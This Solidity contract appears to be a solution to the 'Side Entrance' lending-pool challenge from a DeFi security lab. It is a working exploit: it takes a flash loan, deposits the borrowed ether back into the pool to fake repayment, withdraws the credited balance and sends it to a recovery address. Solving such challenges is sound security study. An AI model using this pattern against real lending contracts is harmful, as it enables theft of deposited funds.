// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attack {
    SideEntranceLenderPool public immutable POOL;

    constructor(SideEntranceLenderPool _pool) {
        POOL = _pool;
    }

    receive() external payable {}

    function attack(uint256 _amount, address _recovery) external {
        POOL.flashLoan(_amount);
        POOL.withdraw();
        payable(_recovery).send(_amount);
    }

    function execute() external payable {
        POOL.deposit{value: address(this).balance}();
    }
}